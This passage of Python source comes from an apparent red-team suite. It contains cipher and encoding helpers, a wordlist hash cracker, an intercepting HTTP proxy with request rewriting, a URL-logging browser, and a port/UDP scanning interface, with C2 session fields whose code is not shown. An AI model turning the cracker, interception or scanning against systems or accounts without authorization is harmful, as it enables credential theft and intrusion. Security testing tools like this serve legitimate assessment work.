        aes_key = SecurityEngine._derive_key(key, salt)
        decryptor = Cipher(algorithms.AES(aes_key), modes.CTR(iv)).decryptor()
        return (decryptor.update(ct) + decryptor.finalize()).decode("utf-8")

    @staticmethod
    def _chacha20_encrypt(plain, key):
        salt = os.urandom(16)
        nonce = os.urandom(16)
        c20_key = SecurityEngine._derive_key(key, salt)
        encryptor = Cipher(algorithms.ChaCha20(c20_key, nonce), mode=None).encryptor()
        ct = encryptor.update(plain.encode("utf-8")) + encryptor.finalize()
        return "CHACHA20:" + base64.b64encode(salt + nonce + ct).decode()

    @staticmethod
    def _chacha20_decrypt(ciphertext, key):
        raw = base64.b64decode(ciphertext[9:])
        salt, nonce, ct = raw[:16], raw[16:32], raw[32:]
        c20_key = SecurityEngine._derive_key(key, salt)
        decryptor = Cipher(algorithms.ChaCha20(c20_key, nonce), mode=None).decryptor()
        return (decryptor.update(ct) + decryptor.finalize()).decode("utf-8")

    @staticmethod
    def _blowfish_encrypt(plain, key):
        salt = os.urandom(16)
        bf_key = SecurityEngine._derive_key(key, salt)[:32]
        iv = os.urandom(8)
        padder = padding.PKCS7(64).padder()
        padded = padder.update(plain.encode("utf-8")) + padder.finalize()
        encryptor = Cipher(algorithms.Blowfish(bf_key), modes.CBC(iv)).encryptor()
        ct = encryptor.update(padded) + encryptor.finalize()
        return "BLOWFISH:" + base64.b64encode(salt + iv + ct).decode()

    @staticmethod
    def _blowfish_decrypt(ciphertext, key):
        raw = base64.b64decode(ciphertext[9:])
        salt, iv, ct = raw[:16], raw[16:24], raw[24:]
        bf_key = SecurityEngine._derive_key(key, salt)[:32]
        decryptor = Cipher(algorithms.Blowfish(bf_key), modes.CBC(iv)).decryptor()
        padded = decryptor.update(ct) + decryptor.finalize()
        unpadder = padding.PKCS7(64).unpadder()
        return (unpadder.update(padded) + unpadder.finalize()).decode("utf-8")

    @staticmethod
    def _tripledes_encrypt(plain, key):
        salt = os.urandom(16)
        des_key = SecurityEngine._derive_key(key, salt)[:24]
        iv = os.urandom(8)
        padder = padding.PKCS7(64).padder()
        padded = padder.update(plain.encode("utf-8")) + padder.finalize()
        encryptor = Cipher(algorithms.TripleDES(des_key), modes.CBC(iv)).encryptor()
        ct = encryptor.update(padded) + encryptor.finalize()
        return "3DES:" + base64.b64encode(salt + iv + ct).decode()

    @staticmethod
    def _tripledes_decrypt(ciphertext, key):
        raw = base64.b64decode(ciphertext[5:])
        salt, iv, ct = raw[:16], raw[16:24], raw[24:]
        des_key = SecurityEngine._derive_key(key, salt)[:24]
        decryptor = Cipher(algorithms.TripleDES(des_key), modes.CBC(iv)).decryptor()
        padded = decryptor.update(ct) + decryptor.finalize()
        unpadder = padding.PKCS7(64).unpadder()
        return (unpadder.update(padded) + unpadder.finalize()).decode("utf-8")

    @staticmethod
    def _rc4_encrypt(plain, key):
        encryptor = Cipher(algorithms.ARC4(key.encode()), mode=None).encryptor()
        ct = encryptor.update(plain.encode("utf-8")) + encryptor.finalize()
        return "RC4:" + base64.b64encode(ct).decode()

    @staticmethod
    def _rc4_decrypt(ciphertext, key):
        ct = base64.b64decode(ciphertext[4:])
        decryptor = Cipher(algorithms.ARC4(key.encode()), mode=None).decryptor()
        return (decryptor.update(ct) + decryptor.finalize()).decode("utf-8")

    @staticmethod
    def _rot13(data):
        return data.translate(str.maketrans(
            "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz",
            "NOPQRSTUVWXYZABCDEFGHIJKLMnopqrstuvwxyzabcdefghijklm"))

    @staticmethod
    def _caesar(data, key, encrypt=True):
        try:
            shift = int(key) % 26
        except ValueError:
            shift = 13
        if not encrypt:
            shift = -shift
        res = []
        for c in data:
            if "a" <= c <= "z":
                res.append(chr((ord(c) - 97 + shift) % 26 + 97))
            elif "A" <= c <= "Z":
                res.append(chr((ord(c) - 65 + shift) % 26 + 65))
            else:
                res.append(c)
        return "".join(res)

    @staticmethod
    def _vigenere(data, key, encrypt=True):
        key = re.sub(r"[^A-Za-z]", "", key or "FEON2026").upper()
        if not key:
            key = "FEON"
        res = []
        ki = 0
        for c in data:
            if c.isalpha():
                shift = ord(key[ki % len(key)]) - 65
                if not encrypt:
                    shift = -shift
                base = 97 if c.islower() else 65
                res.append(chr((ord(c) - base + shift) % 26 + base))
                ki += 1
            else:
                res.append(c)
        return "".join(res)

    @staticmethod
    def _base32(data, encrypt=True):
        if encrypt:
            return base64.b32encode(data.encode("utf-8")).decode()
        return base64.b32decode(data).decode("utf-8")

    @staticmethod
    def _base58_encode(data):
        raw = data.encode("utf-8")
        n = int.from_bytes(raw, "big")
        res = ""
        while n > 0:
            n, rem = divmod(n, 58)
            res = BASE58_ALPHABET[rem] + res
        for b in raw:
            if b == 0:
                res = "1" + res
            else:
                break
        return res

    @staticmethod
    def _base58_decode(data):
        n = 0
        for c in data:
            n = n * 58 + BASE58_ALPHABET.index(c)
        raw = n.to_bytes((n.bit_length() + 7) // 8, "big") if n else b""
        ones = len(data) - len(data.lstrip("1"))
        return (b"\x00" * ones + raw).decode("utf-8")

    @staticmethod
    def _fernet_key(key):
        try:
            from cryptography.fernet import Fernet
        except ImportError:
            return None
        return Fernet(base64.urlsafe_b64encode(hashlib.sha256(key.encode()).digest()))

    @staticmethod
    def _fernet_encrypt(plain, key):
        return "FERNET:" + SecurityEngine._fernet_key(key).encrypt(plain.encode()).decode()

    @staticmethod
    def _fernet_decrypt(ciphertext, key):
        return SecurityEngine._fernet_key(key).decrypt(ciphertext[7:]).decode()

    @staticmethod
    def _legacy_xor(data, key="FEON2026", encrypt=True):
        if encrypt:
            xor_data = "".join(chr(ord(c) ^ ord(key[i % len(key)])) for i, c in enumerate(data))
            return base64.b64encode(xor_data.encode()).decode()
        else:
            try:
                decoded = base64.b64decode(data).decode()
                return "".join(chr(ord(c) ^ ord(key[i % len(key)])) for i, c in enumerate(decoded))
            except Exception:
                return "[-] Error: Token data corruption or invalid key."

    @staticmethod
    def process_crypto(data, key="FEON2026", encrypt=True, cipher="AES-GCM"):
        if cipher == "Base64":
            try:
                return base64.b64encode(data.encode()).decode() if encrypt else base64.b64decode(data).decode()
            except Exception as e:
                return f"[-] Base64 Error: {e}"
        if cipher == "Base32":
            try:
                return SecurityEngine._base32(data, encrypt)
            except Exception as e:
                return f"[-] Base32 Error: {e}"
        if cipher == "Base58":
            try:
                return SecurityEngine._base58_encode(data) if encrypt else SecurityEngine._base58_decode(data.strip())
            except Exception as e:
                return f"[-] Base58 Error: {e}"
        if cipher == "XOR":
            return SecurityEngine._legacy_xor(data, key, encrypt)
        if cipher == "ROT13":
            return SecurityEngine._rot13(data)
        if cipher == "Caesar":
            return SecurityEngine._caesar(data, key, encrypt)
        if cipher == "Vigenère":
            return SecurityEngine._vigenere(data, key, encrypt)
        if cipher == "Fernet":
            try:
                if not SecurityEngine._fernet_key(key):
                    return "[-] cryptography.fernet not available"
                if encrypt:
                    return SecurityEngine._fernet_encrypt(data, key)
                return SecurityEngine._fernet_decrypt(data.strip(), key)
            except Exception as e:
                return f"[-] Fernet Error: {e}"
        if not HAS_CRYPTOGRAPHY:
            return "[-] Selected cipher requires the 'cryptography' package."
        try:
            if encrypt:
                if cipher == "AES-CBC":
                    return SecurityEngine._aes_cbc_encrypt(data, key)
                if cipher == "AES-CTR":
                    return SecurityEngine._aes_ctr_encrypt(data, key)
                if cipher == "ChaCha20":
                    return SecurityEngine._chacha20_encrypt(data, key)
                if cipher == "Blowfish":
                    return SecurityEngine._blowfish_encrypt(data, key)
                if cipher == "3DES":
                    return SecurityEngine._tripledes_encrypt(data, key)
                if cipher == "RC4":
                    return SecurityEngine._rc4_encrypt(data, key)
                return SecurityEngine._aes_encrypt(data, key)
            else:
                if data.startswith("AES-CBC:"):
                    return SecurityEngine._aes_cbc_decrypt(data, key)
                if data.startswith("AES-CTR:"):
                    return SecurityEngine._aes_ctr_decrypt(data, key)
                if data.startswith("CHACHA20:"):
                    return SecurityEngine._chacha20_decrypt(data, key)
                if data.startswith("BLOWFISH:"):
                    return SecurityEngine._blowfish_decrypt(data, key)
                if data.startswith("3DES:"):
                    return SecurityEngine._tripledes_decrypt(data, key)
                if data.startswith("RC4:"):
                    return SecurityEngine._rc4_decrypt(data, key)
                if data.startswith("AES:"):
                    return SecurityEngine._aes_decrypt(data, key)
                if data.startswith("FERNET:"):
                    return SecurityEngine._fernet_decrypt(data.strip(), key)
                return SecurityEngine._legacy_xor(data, key, encrypt=False)
        except Exception as e:
            return f"[-] Crypto Error: {e}"

    # ── RSA / ECDSA ──────────────────────────────────────────────────────
    @staticmethod
    def generate_keypair(curve="RSA"):
        priv = (rsa.generate_private_key(public_exponent=65537, key_size=2048)
                if curve == "RSA" else ec.generate_private_key(ec.SECP256R1()))
        priv_pem = priv.private_bytes(
            serialization.Encoding.PEM, serialization.PrivateFormat.PKCS8,
            serialization.NoEncryption()).decode()
        pub_pem = priv.public_key().public_bytes(
            serialization.Encoding.PEM, serialization.PublicFormat.SubjectPublicKeyInfo).decode()
        return priv_pem, pub_pem

    @staticmethod
    def rsa_encrypt(data, pub_pem):
        pub = serialization.load_pem_public_key(pub_pem.encode())
        ct = pub.encrypt(data.encode(), rsa_padding.OAEP(
            mgf=rsa_padding.MGF1(hashes.SHA256()), algorithm=hashes.SHA256(), label=None))
        return base64.b64encode(ct).decode()

    @staticmethod
    def rsa_decrypt(data, priv_pem):
        priv = serialization.load_pem_private_key(priv_pem.encode(), password=None)
        pt = priv.decrypt(base64.b64decode(data), rsa_padding.OAEP(
            mgf=rsa_padding.MGF1(hashes.SHA256()), algorithm=hashes.SHA256(), label=None))
        return pt.decode()

    @staticmethod
    def rsa_sign(data, priv_pem):
        priv = serialization.load_pem_private_key(priv_pem.encode(), password=None)
        sig = priv.sign(data.encode(), rsa_padding.PSS(
            mgf=rsa_padding.MGF1(hashes.SHA256()),
            salt_length=rsa_padding.PSS.MAX_LENGTH), hashes.SHA256())
        return base64.b64encode(sig).decode()

    @staticmethod
    def rsa_verify(data, sig_b64, pub_pem):
        try:
            pub = serialization.load_pem_public_key(pub_pem.encode())
            pub.verify(base64.b64decode(sig_b64), data.encode(), rsa_padding.PSS(
                mgf=rsa_padding.MGF1(hashes.SHA256()),
                salt_length=rsa_padding.PSS.MAX_LENGTH), hashes.SHA256())
            return True
        except Exception:
            return False

    @staticmethod
    def ecdsa_sign(data, priv_pem):
        priv = serialization.load_pem_private_key(priv_pem.encode(), password=None)
        sig = priv.sign(data.encode(), ec.ECDSA(hashes.SHA256()))
        return base64.b64encode(sig).decode()

    @staticmethod
    def ecdsa_verify(data, sig_b64, pub_pem):
        try:
            pub = serialization.load_pem_public_key(pub_pem.encode())
            pub.verify(base64.b64decode(sig_b64), data.encode(), ec.ECDSA(hashes.SHA256()))
            return True
        except Exception:
            return False

    # ── File encryption (AES-GCM) ────────────────────────────────────────
    @staticmethod
    def encrypt_file(src, dst, password):
        with open(src, "rb") as f:
            data = f.read()
        salt = os.urandom(16)
        iv = os.urandom(12)
        key = SecurityEngine._derive_key(password, salt)
        e = Cipher(algorithms.AES(key), modes.GCM(iv)).encryptor()
        ct = e.update(data) + e.finalize()
        with open(dst, "wb") as f:
            f.write(b"TS1F:" + salt + iv + e.tag + ct)

    @staticmethod
    def decrypt_file(src, dst, password):
        with open(src, "rb") as f:
            raw = f.read()
        if raw[:5] != b"TS1F:":
            raise ValueError("Not a Tools1 encrypted file")
        raw = raw[5:]
        salt, iv, tag, ct = raw[:16], raw[16:28], raw[28:44], raw[44:]
        key = SecurityEngine._derive_key(password, salt)
        d = Cipher(algorithms.AES(key), modes.GCM(iv, tag)).decryptor()
        with open(dst, "wb") as f:
            f.write(d.update(ct) + d.finalize())

    # ── Secret vault (encrypted JSON config) ─────────────────────────────
    @staticmethod
    def save_secret(payload, password, path):
        data = json.dumps(payload).encode()
        salt = os.urandom(16)
        iv = os.urandom(12)
        key = SecurityEngine._derive_key(password, salt)
        e = Cipher(algorithms.AES(key), modes.GCM(iv)).encryptor()
        ct = e.update(data) + e.finalize()
        with open(path, "wb") as f:
            f.write(b"TS1S:" + salt + iv + e.tag + ct)

    @staticmethod
    def load_secret(password, path):
        with open(path, "rb") as f:
            raw = f.read()
        if raw[:5] != b"TS1S:":
            raise ValueError("Invalid config file")
        raw = raw[5:]
        salt, iv, tag, ct = raw[:16], raw[16:28], raw[28:44], raw[44:]
        key = SecurityEngine._derive_key(password, salt)
        d = Cipher(algorithms.AES(key), modes.GCM(iv, tag)).decryptor()
        return json.loads(d.update(ct) + d.finalize())

    # ── Hash Toolkit ─────────────────────────────────────────────────────
    @staticmethod
    def hash_text(text, algo):
        fn = HASH_FUNCS.get(algo)
        if fn:
            try:
                return fn(text)
            except Exception:
                return f"[-] {algo} unavailable in this build"
        return ""

    @staticmethod
    def identify_hash(h):
        h = h.strip()
        L = len(h)
        for name, exact in HASH_LEN.items():
            if L == exact and re.fullmatch(r"[0-9a-fA-F]+", h):
                return name
        return "Unknown format"

    @staticmethod
    def crack_hash(target, algo, wordlist, log_callback=None, batch_size=10000):
        comp = CRACK_FUNCS.get(algo)
        if not comp:
            return f"[-] Cracking not supported for {algo}."
        total, checked, found = 0, 0, None
        try:
            with open(wordlist, "rb") as f:
                for _ in f:
                    total += 1
        except Exception as e:
            return f"[-] Cannot open wordlist: {e}"
        target = target.strip().lower()
        with open(wordlist, "rb") as f:
            for raw in f:
                w = raw.strip()
                checked += 1
                if comp(w) == target:
                    found = w.decode(errors="ignore")
                    break
                if checked % batch_size == 0 and log_callback:
                    log_callback(f"   ...{checked}/{total} tried")
        if found:
            return f"[+] CRACKED: '{found}'  (matched in {checked:,} attempts)"
        return f"[-] Not found after {checked:,} attempts."

    # ── Decoder / Encoder ────────────────────────────────────────────────
    @staticmethod
    def _morse_encode(data):
        out = []
        for word in data.upper().split():
            out.append(" ".join(MORSE.get(c, "?") for c in word))
        return " / ".join(out)

    @staticmethod
    def _morse_decode(data):
        out = []
        for word in data.strip().split(" / "):
            out.append("".join(MORSE_REV.get(c, "?") for c in word.split()))
        return " ".join(out)

    @staticmethod
    def decode_transform(data, action):
        try:
            if action == "Base64 Encode":
                return base64.b64encode(data.encode()).decode()
            if action == "Base64 Decode":
                return base64.b64decode(data).decode(errors="replace")
            if action == "Base32 Encode":
                return base64.b32encode(data.encode()).decode()
            if action == "Base32 Decode":
                return base64.b32decode(data).decode(errors="replace")
            if action == "Hex Encode":
                return data.encode().hex()
            if action == "Hex Decode":
                return bytes.fromhex(data).decode(errors="replace")
            if action == "URL Encode":
                return urllib.parse.quote(data, safe="")
            if action == "URL Decode":
                return urllib.parse.unquote(data)
            if action == "HTML Encode":
                return html.escape(data)
            if action == "HTML Decode":
                return html.unescape(data)
            if action == "Unicode Escape":
                return data.encode().decode("unicode_escape")
            if action == "Unicode Unescape":
                return data.encode("utf-8").decode("unicode_escape").encode("latin-1").decode("utf-8", errors="replace")
            if action == "ROT13":
                return SecurityEngine._rot13(data)
            if action == "Morse Encode":
                return SecurityEngine._morse_encode(data)
            if action == "Morse Decode":
                return SecurityEngine._morse_decode(data)
            if action == "Gzip Compress":
                return base64.b64encode(zlib.compress(data.encode())).decode()
            if action == "Gzip Decompress":
                return zlib.decompress(base64.b64decode(data)).decode(errors="replace")
            if action == "Reverse":
                return data[::-1]
            if action == "Uppercase":
                return data.upper()
            if action == "Lowercase":
                return data.lower()
            if action == "Binary Encode":
                return " ".join(f"{b:08b}" for b in data.encode())
            if action == "Binary Decode":
                return "".join(chr(int(b, 2)) for b in data.split() if b)
        except Exception as e:
            return f"[-] Error: {e}"
        return data

# ───────────────────────────────────────────────────────────────────────
# HTTP INTERCEPTING PROXY (Burp-Proxy Equivalent)
# ───────────────────────────────────────────────────────────────────────
class ThreadingProxyServer(http.server.ThreadingHTTPServer):
    daemon_threads = True

class ProxyHandler(http.server.BaseHTTPRequestHandler):
    history_callback = None
    rewrite_find = None
    rewrite_replace = ""
    protocol_version = "HTTP/1.1"

    def log_message(self, *args):
        pass

    def _record(self, method, host, path, status, size, req_head, resp_head, resp_body):
        if ProxyHandler.history_callback:
            try:
                ProxyHandler.history_callback(
                    method, host, path, status, size,
                    req_head, resp_head, resp_body[:4000].decode(errors="replace"),
                )
            except Exception:
                pass

    def _apply_rewrite(self, text):
        if ProxyHandler.rewrite_find and ProxyHandler.rewrite_find in text:
            return text.replace(ProxyHandler.rewrite_find, ProxyHandler.rewrite_replace)
        return text

    def _handle(self, method):
        host = self.headers.get("Host", "")
        length = int(self.headers.get("Content-Length") or 0)
        body = self.rfile.read(length) if length else b""
        path = self._apply_rewrite(self.path)
        if body and ProxyHandler.rewrite_find:
            body = self._apply_rewrite(body.decode(errors="replace")).encode()
        req_head = f"{method} {path} {self.request_version}\n"
        for k, v in self.headers.items():
            req_head += f"{k}: {v}\n"
        if length:
            req_head += f"\n{body.decode(errors='replace')[:2000]}"
        try:
            conn = http.client.HTTPConnection(host, timeout=15)
            headers = dict(self.headers)
            if body:
                headers["Content-Length"] = str(len(body))
            conn.request(method, path, body=body, headers=headers)
            resp = conn.getresponse()
            resp_body = resp.read()
            resp_head = f"{resp.status} {resp.reason}\n"
            for k, v in resp.getheaders():
                resp_head += f"{k}: {v}\n"
            self.send_response(resp.status)
            for k, v in resp.getheaders():
                self.send_header(k, v)
            self.send_header("Content-Length", str(len(resp_body)))
            self.end_headers()
            self.wfile.write(resp_body)
            self._record(method, host, path, resp.status, len(resp_body), req_head, resp_head, resp_body)
            conn.close()
        except Exception as e:
            self._record(method, host, path, 502, 0, req_head, "", "")
            self.send_error(502, f"Proxy error: {e}")

    def do_GET(self):     self._handle("GET")
    def do_POST(self):    self._handle("POST")
    def do_PUT(self):     self._handle("PUT")
    def do_DELETE(self):  self._handle("DELETE")
    def do_HEAD(self):    self._handle("HEAD")
    def do_OPTIONS(self): self._handle("OPTIONS")

    def do_CONNECT(self):
        host, _, port = self.path.partition(":")
        port = int(port or 443)
        try:
            upstream = socket.create_connection((host, port), timeout=15)
            self.send_response(200, "Connection Established")
            self.end_headers()
            self._record("CONNECT", f"{host}:{port}", "/", 200, 0,
                         f"CONNECT {self.path}", "", "[TLS tunnel]")
            self.connection.setblocking(False)
            upstream.setblocking(False)
            socks = [self.connection, upstream]
            while True:
                r, _, _ = select.select(socks, [], [], 5)
                if not r:
                    continue
                for s in r:
                    try:
                        data = s.recv(65536)
                        if not data:
                            return
                        (upstream if s is self.connection else self.connection).sendall(data)
                    except Exception:
                        return
        except Exception as e:
            self.send_error(502, f"Tunnel error: {e}")

# ───────────────────────────────────────────────────────────────────────
# EMBEDDED QTWEBENGINE BROWSER (launched as isolated subprocess)
# ───────────────────────────────────────────────────────────────────────
BROWSER_SCRIPT = '''
import sys, json, os, datetime
from PyQt5.QtWidgets import QApplication, QMainWindow, QToolBar, QLineEdit, QAction
from PyQt5.QtCore import QUrl
from PyQt5.QtWebEngineWidgets import QWebEngineView

log_path, proxy = sys.argv[1], sys.argv[2]
if proxy:
    os.environ["QTWEBENGINE_CHROMIUM_FLAGS"] = "--proxy-server=" + proxy

app = QApplication(sys.argv)

class Browser(QMainWindow):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("LOL Tools Secure Browser")
        self.resize(1280, 820)
        self.view = QWebEngineView(self)
        self.setCentralWidget(self.view)
        tb = QToolBar("Nav")
        self.addToolBar(tb)
        self.urlbar = QLineEdit()
        self.urlbar.setFixedWidth(560)
        self.urlbar.returnPressed.connect(self._go)
        tb.addWidget(self.urlbar)
        back = QAction("< Back", self); back.triggered.connect(self.view.back); tb.addAction(back)
        fwd = QAction("Forward >", self); fwd.triggered.connect(self.view.forward); tb.addAction(fwd)
        rel = QAction("Reload", self); rel.triggered.connect(self.view.reload); tb.addAction(rel)
        home = QAction("Home", self); home.triggered.connect(lambda: self.view.setUrl(QUrl("https://www.google.com"))); tb.addAction(home)
        self.view.urlChanged.connect(lambda u: self.urlbar.setText(u.toString()))
        self.view.titleChanged.connect(self.setWindowTitle)
        self.view.urlChanged.connect(self._log)
    def _go(self):
        url = self.urlbar.text()
        if not url.startswith("http"):
            url = "https://" + url
        self.view.setUrl(QUrl(url))
    def _log(self, url):
        try:
            with open(log_path, "a") as f:
                f.write(json.dumps({"time": datetime.datetime.now().strftime("%H:%M:%S"), "url": url.toString()}) + "\\n")
        except Exception:
            pass

b = Browser()
b.show()
sys.exit(app.exec_())
'''

# ───────────────────────────────────────────────────────────────────────
# MAIN APPLICATION — MODERN SIDEBAR UI
# ───────────────────────────────────────────────────────────────────────
class EnterpriseC2Suite:
    def __init__(self, root):
        self.root = root
        self.root.title("LOL Tools Enterprise — Red Team RMM Suite")
        self.root.geometry("1280x820")
        self.root.configure(bg=BG)
        self.db = OperationDB()
        self.page_frames = {}
        self.nav_buttons = []
        self.current_page = 0
        self.handler_proc = None
        self.handler_master = None
        self.proxy_server = None
        self.proxy_entries = []
        self.browser_proc = None
        self.loop_thread = None
        self.c2_sessions = {}
        self.c2_jobs = []
        self.c2_bot = None
        self.c2_started = None
        self.c2_stop = threading.Event()
        self.browser_log_file = os.path.join(os.path.expanduser("~"), ".tools1_browser_history.jsonl")
        self.log_queue = queue.Queue()

        self._configure_styles()
        self.root.after(100, self._poll_logs)
        self._build_layout()

    def _configure_styles(self):
        s = ttk.Style()
        s.theme_use("clam")
        s.configure("TFrame", background=BG)
        s.configure("TNotebook", background=BG, borderwidth=0)
        s.configure("TNotebook.Tab", background=BG3, foreground=TDIM, font=(FONT, 9), padding=[12, 5])
        s.map("TNotebook.Tab", background=[("selected", BG2)], foreground=[("selected", ACCENT)])
        s.configure("TCombobox", fieldbackground=BG2, background=BG2, foreground=ACCENT,
                    arrowcolor=ACCENT, bordercolor=BORDER)
        s.configure("Treeview", background=BG2, fieldbackground=BG2, foreground=TEXT,
                    bordercolor=BORDER, font=(MONO, 9))
        s.map("Treeview", background=[("selected", ACCENT2)], foreground=[("selected", BG)])
        s.configure("Treeview.Heading", background=BG3, foreground=ACCENT2,
                    font=(FONT, 9, "bold"), relief="flat")

    def _build_layout(self):
        # Sidebar navigation
        sidebar = tk.Frame(self.root, bg=SIDE, width=215)
        sidebar.pack(side="left", fill="y")
        sidebar.pack_propagate(False)
        tk.Label(sidebar, text="🛡️ LOL TOOLS", bg=SIDE, fg=ACCENT,
                 font=(FONT, 13, "bold")).pack(pady=(20, 2))
        tk.Label(sidebar, text="R E D · T E A M", bg=SIDE, fg=TDIM,
                 font=(MONO, 8)).pack(pady=(0, 16))
        for i, (icon, name, _) in enumerate(PAGES):
            btn = tk.Button(sidebar, text=f"  {icon}  {name}", bg=BG3, fg=TEXT,
                            activebackground=ACCENT, activeforeground=BG, relief="flat",
                            anchor="w", bd=0, font=(FONT, 10), pady=9,
                            command=lambda idx=i: self._show_page(idx))
            btn.pack(fill="x", padx=8, pady=2)
            self.nav_buttons.append((name, btn))
        tk.Label(sidebar, text="authorized testing only", bg=SIDE, fg=TDIM,
                 font=(MONO, 7)).pack(side="bottom", pady=8)

        # Main area
        self.main = tk.Frame(self.root, bg=BG)
        self.main.pack(side="left", fill="both", expand=True)
        header = tk.Frame(self.main, bg=BG2, height=56)
        header.pack(fill="x")
        header.pack_propagate(False)
        self.header_title = tk.Label(header, text="", bg=BG2, fg=TEXT, font=(FONT, 13, "bold"))
        self.header_title.pack(side="left", padx=20)
        self.gateway_status = tk.Label(header, text="● Gateway Offline", bg=BG2, fg=TDIM, font=(MONO, 9))
        self.gateway_status.pack(side="right", padx=20)
        self.page_container = tk.Frame(self.main, bg=BG)
        self.page_container.pack(fill="both", expand=True)
        for _, name, _ in PAGES:
            f = tk.Frame(self.page_container, bg=BG)
            self.page_frames[name] = f

        # Status bar
        statusbar = tk.Frame(self.root, bg=BG3, height=28)
        statusbar.pack(side="bottom", fill="x")
        statusbar.pack_propagate(False)
        self.status_label = tk.Label(statusbar, text="● Ready", bg=BG3, fg=TDIM, font=(MONO, 8))
        self.status_label.pack(side="left", padx=12)
        self.db_status = tk.Label(statusbar, text="", bg=BG3, fg=TDIM, font=(MONO, 8))
        self.db_status.pack(side="right", padx=12)
        self._refresh_db_status()

        for _, name, builder in PAGES:
            getattr(self, builder)()
        self._show_page(0)

    def _show_page(self, idx):
        name = PAGES[idx][1]
        for f in self.page_frames.values():
            f.pack_forget()
        self.page_frames[name].pack(fill="both", expand=True)
        self.current_page = idx
        for nm, btn in self.nav_buttons:
            if nm == name:
                btn.configure(bg=ACCENT, fg=BG)
            else:
                btn.configure(bg=BG3, fg=TEXT)
        self.header_title.configure(text=f"{PAGES[idx][0]}  {PAGES[idx][1]}")

    # ── UI helpers ───────────────────────────────────────────────────────
    def _card(self, parent, title=None, bg=BG2, padx=16, pady=12):
        c = tk.Frame(parent, bg=bg, highlightbackground=BORDER, highlightthickness=1, padx=14, pady=10)
        c.pack(fill="x", padx=padx, pady=pady)
        if title:
            tk.Label(c, text=title, bg=bg, fg=ACCENT2, font=(FONT, 10, "bold")).pack(anchor="w", pady=(0, 8))
        content = tk.Frame(c, bg=bg)
        content.pack(fill="both", expand=True)
        return content

    def _btn(self, parent, text, cmd, bg=ACCENT, fg=BG, w=None):
        b = tk.Button(parent, text=text, bg=bg, fg=fg, activebackground=bg,
                      activeforeground=fg, relief="flat", font=(FONT, 9, "bold"),
                      cursor="hand2", command=cmd)
        if w:
            b.configure(width=w)
        return b

    def _entry(self, parent, width=28, default=""):
        e = tk.Entry(parent, bg=BG, fg=ACCENT, insertbackground=ACCENT, relief="flat",
                     font=(MONO, 10), width=width)
        if default:
            e.insert(0, default)
        return e

    def _log_op(self, category, action, detail=""):
        self.log_queue.put(("op", category, action, detail))

    def _refresh_db_status(self):
        try:
            self.db_status.configure(text=f"🗄 {self.db.count()} operations logged")
        except Exception:
            pass

    # ═══════════════════════════════════════════════════════════════════
    # PAGE: AUDIT
    # ═══════════════════════════════════════════════════════════════════
    def _build_audit_page(self):
        f = self.page_frames["Audit"]
        bar = self._card(f, "🔎 Infrastructure Recon")
        row = tk.Frame(bar, bg=BG2)
        row.pack(fill="x")
        tk.Label(row, text="Targets (comma-sep):", bg=BG2, fg=TEXT).pack(side="left")
        self.target_entry = self._entry(row, 28, "example.com")
        self.target_entry.pack(side="left", padx=8)
        self.scan_mode = ttk.Combobox(row, values=["Quick — Common", "Full — All ports"],
                                      state="readonly", width=16)
        self.scan_mode.current(0)
        self.scan_mode.pack(side="left", padx=8)
        tk.Label(row, text="Threads:", bg=BG2, fg=TEXT).pack(side="left")
        self.threads_entry = self._entry(row, 5, "256")
        self.threads_entry.pack(side="left", padx=8)

        row2 = tk.Frame(bar, bg=BG2)
        row2.pack(fill="x", pady=(8, 0))
        self._btn(row2, "▶ Scan", self._trigger_local_scan).pack(side="left", padx=4)
        self._btn(row2, "📡 UDP Sweep", self._trigger_udp, ACCENT2).pack(side="left", padx=4)
        self._btn(row2, "🔎 OSINT", self._trigger_osint, PURPLE).pack(side="left", padx=4)
        self._btn(row2, "💻 Sys Info", self._trigger_sysinfo, ACCENT2).pack(side="left", padx=4)
        self._btn(row2, "📄 Export HTML", self._trigger_report, YELLOW, BG).pack(side="left", padx=4)
        self._btn(row2, "🧹 Clear", self._audit_clear, BG3, TEXT).pack(side="left", padx=4)

        self.audit_log = scrolledtext.ScrolledText(f, bg=BG, fg=TEXT, insertbackground=ACCENT,
                                                   relief="flat", font=(MONO, 10))
        self.audit_log.pack(fill="both", expand=True, padx=16, pady=(0, 12))

    def _audit_clear(self):
        self.audit_log.delete("1.0", "end")

    def _append(self, widget, message):
        try:
            widget.insert("end", f"{message}\n")
            widget.see("end")
        except Exception:
            pass

    def _poll_logs(self):
        try:
            while True:
                self._handle_log_item(self.log_queue.get_nowait())
        except queue.Empty:
            pass
        self.root.after(100, self._poll_logs)

    def _handle_log_item(self, item):
        kind = item[0]
        try:
            if kind == "append":
                w = getattr(self, item[1], None)
                if w is not None:
                    self._append(w, item[2])
            elif kind == "set":
                w = getattr(self, item[1], None)
                if w is not None:
                    w.delete("1.0", "end")
                    w.insert("1.0", item[2])
            elif kind == "label":
                w = getattr(self, item[1], None)
                if w is not None:
                    w.configure(text=item[2], fg=item[3])
            elif kind == "proxy_row":
                self._proxy_insert_row(item[1])
            elif kind == "c2_refresh":
                self._refresh_c2_sessions()
            elif kind == "c2_job":
                self._c2_insert_job(item[1])
            elif kind == "browser_reload":
                self._browser_load_history()
            elif kind == "op":
                self.db.log(item[1], item[2], item[3])
                self._refresh_db_status()
        except Exception:
            pass

    def _log_audit(self, message):
        self.log_queue.put(("append", "audit_log", message))

    def _trigger_local_scan(self):
        targets = [t.strip() for t in self.target_entry.get().split(",") if t.strip()]
        if not targets:
            return
        quick = self.scan_mode.current() == 0
        try:
            threads = max(1, min(2048, int(self.threads_entry.get())))
        except ValueError:
            threads = 256
        self.audit_log.delete("1.0", "end")
        for t in targets:
            threading.Thread(target=lambda target=t: self._run_scan_thread(
                target, quick, threads), daemon=True).start()

    def _run_scan_thread(self, target, quick, threads):
        report = SecurityEngine.run_full_scan(target, self._log_audit, quick=quick, max_threads=threads)
        self._log_op("scan", f"Scan {target} ({'quick' if quick else 'full'})",
                     f"{len([l for l in report.splitlines() if 'EXPOSED' in l])} ports exposed")

    def _trigger_udp(self):
        target = self.target_entry.get().strip().split(",")[0].strip()
        if not target:
            return
        self._log_audit(f"[~] Starting UDP sweep for {target}...")
        threading.Thread(target=lambda: SecurityEngine.udp_scan(target, self._log_audit), daemon=True).start()

    def _trigger_osint(self):
        target = self.target_entry.get().strip().split(",")[0].strip()
        if not target:
            return
        self._log_audit(f"[~] OSINT lookup: {target}")
        threading.Thread(target=lambda: self._osint_thread(target), daemon=True).start()

    def _osint_thread(self, target):
